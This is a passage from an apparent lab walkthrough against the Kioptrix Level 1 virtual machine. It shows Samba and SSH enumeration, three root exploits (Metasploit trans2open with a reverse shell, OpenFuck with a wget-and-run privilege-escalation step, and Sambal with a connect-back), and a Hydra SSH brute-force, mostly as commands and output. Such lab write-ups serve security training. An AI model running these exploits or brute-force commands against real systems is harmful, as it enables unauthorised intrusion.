S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)

 =============================================== 
|    Getting printer info for 192.168.88.129    |
 =============================================== 
No printers returned.


enum4linux complete on Thu Jan  2 16:24:41 2020

```

### 192.168.88.129 - 22

| Time                | command/module                       | Finding       |
|---------------------|--------------------------------------|---------------|
| 2019-12-31 13:22:06 | nmap                                 | OpenSSH 2.9p2 |
| 2019-12-31 13:44:47 | ssh                                  | old key exchange / ciphers <br> DH SHA1/AES128-CBC|

#### SSH

```bash
ssh 192.168.88.129
```

```bash
Unable to negotiate with 192.168.88.129 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

```bash
ssh 192.168.88.129 -oKexAlgorithms=diffie-hellman-group-exchange-sha1
```

```bash
Unable to negotiate with 192.168.88.129 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se
```

```bash
ssh 192.168.88.129 -oKexAlgorithms=diffie-hellman-group-exchange-sha1 -c aes128-cbc
```

```bash
root@192.168.88.129's password: 
```

## Exploit

### trans2open

```bash
msf5 > workspace
  kioptrix
* **Default
msf5 > workspace kioptrix
[*] Workspace: kioptrix
msf5 > use exploit/linux/samba/trans2open
msf5 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


msf5 exploit(linux/samba/trans2open) > set RHOSTS 192.168.88.129
RHOSTS => 192.168.88.129
msf5 exploit(linux/samba/trans2open) > options
Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.88.129   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


msf5 exploit(linux/samba/trans2open) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


msf5 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 192.168.88.128:4444 
[*] 192.168.88.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.88.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.88.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.88.129:139 - Trying return address 0xbffffafc...
[*] Sending stage (985320 bytes) to 192.168.88.129
[*] 192.168.88.129 - Meterpreter session 1 closed.  Reason: Died
[*] Meterpreter session 1 opened (127.0.0.1 -> 192.168.88.129:32800) at 2020-01-02 18:10:24 +0100
[*] 192.168.88.129:139 - Trying return address 0xbffff9fc...
[*] Sending stage (985320 bytes) to 192.168.88.129
[*] Meterpreter session 2 opened (192.168.88.128:4444 -> 192.168.88.129:32801) at 2020-01-02 18:10:25 +0100
[*] 192.168.88.129 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.88.129:139 - Trying return address 0xbffff8fc...
[*] Sending stage (985320 bytes) to 192.168.88.129
[*] 192.168.88.129 - Meterpreter session 3 closed.  Reason: Died
[*] Meterpreter session 3 opened (127.0.0.1 -> 192.168.88.129:32802) at 2020-01-02 18:10:27 +0100
[*] 192.168.88.129:139 - Trying return address 0xbffff7fc...
[*] Sending stage (985320 bytes) to 192.168.88.129
[*] 192.168.88.129 - Meterpreter session 4 closed.  Reason: Died
[*] Meterpreter session 4 opened (127.0.0.1 -> 192.168.88.129:32803) at 2020-01-02 18:10:28 +0100

msf5 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf5 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.88.129   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.88.128   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


msf5 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 192.168.88.128:4444 
[*] 192.168.88.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.88.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.88.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.88.129:139 - Trying return address 0xbffffafc...
[*] Command shell session 5 opened (192.168.88.128:4444 -> 192.168.88.129:32804) at 2020-01-02 18:14:44 +0100

whoami
root
hostname
kioptrix.level1
```

### OpenFuck

```bash
root@kali:/opt# git clone https://github.com/heltonWernik/OpenLuck
Cloning into 'OpenLuck'...
remote: Enumerating objects: 22, done.
remote: Total 22 (delta 0), reused 0 (delta 0), pack-reused 22
Unpacking objects: 100% (22/22), done.
root@kali:/opt# cd OpenLuck/
root@kali:/opt/OpenLuck# ls
OpenFuck.c  README.md
root@kali:/opt/OpenLuck# apt install libssl-dev;gcc -o OpenFuck OpenFuck.c -lcrypto
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libayatana-ido3-0.4-0 libbfio1 libdvdread4 libhogweed4 libhwloc5 libisl21 libjim0.77 libjte1 libnettle6 libobjc-9-dev python-magic python-paramiko python-pefile
  python-qrcode
Use 'apt autoremove' to remove them.
Suggested packages:
  libssl-doc
The following NEW packages will be installed:
  libssl-dev
0 upgraded, 1 newly installed, 0 to remove and 62 not upgraded.
Need to get 1,797 kB of archives.
After this operation, 8,095 kB of additional disk space will be used.
Get:1 http://ftp2.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libssl-dev amd64 1.1.1d-2 [1,797 kB]
Fetched 1,797 kB in 1s (2,965 kB/s)  
Selecting previously unselected package libssl-dev:amd64.
(Reading database ... 311173 files and directories currently installed.)
Preparing to unpack .../libssl-dev_1.1.1d-2_amd64.deb ...
Unpacking libssl-dev:amd64 (1.1.1d-2) ...
Setting up libssl-dev:amd64 (1.1.1d-2) ...
root@kali:/opt/OpenLuck# ls
OpenFuck  OpenFuck.c  README.md

root@kali:/opt/OpenLuck# ./OpenFuck

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)

root@kali:/opt/OpenLuck# ./OpenFuck 0x6a 192.168.88.129 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
root@kali:/opt/OpenLuck# ./OpenFuck 0x6b 192.168.88.129 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
--13:24:59--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 404 Not Found
13:24:59 ERROR 404: Not Found.

gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./p: No such file or directory
bash-2.05$ 
bash-2.05$ whoami
whoami
apache
bash-2.05$ hostname
hostname
kioptrix.level1
bash-2.05$ Good Bye!
root@kali:/opt/OpenLuck# ./OpenFuck 0x6b 192.168.88.129 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
--13:35:23--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
--13:35:23--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   3.74 MB/s

13:35:23 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

[+] Attached to 2071
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
hostname
kioptrix.level1
```

### Sambal

```bash
searchsploit "Samba < 2.2" 

------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                   |  Path
                                                                                                                                                 | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                     | exploits/osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                          | exploits/linux/remote/16321.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                | exploits/multiple/remote/10.c
------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

searchsploit -m exploits/multiple/remote/10.c


  Exploit: Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/10
     Path: /usr/share/exploitdb/exploits/multiple/remote/10.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/10.c
gcc -o sambal 10.c 

./sambal 
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./sambal [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode


./sambal -b 0 -v -c 192.168.88.128 192.168.88.129
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Using ret: [0xbffffc7c]
+ Using ret: [0xbffffb50]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)

```

## Bruteforce SSH

### Hydra

```bash
hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8
```

```bash
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-02 19:23:53
[DATA] max 8 tasks per 1 server, overall 8 tasks, 1009 login tries (l:1/p:1009), ~127 tries per task
[DATA] attacking ssh://192.168.88.129:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://root@192.168.88.129:22
[INFO] Successful, password authentication is supported by ssh://192.168.88.129:22
[STATUS] attack finished for 192.168.88.129 (waiting for children to complete tests)
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-02 19:40:28
```
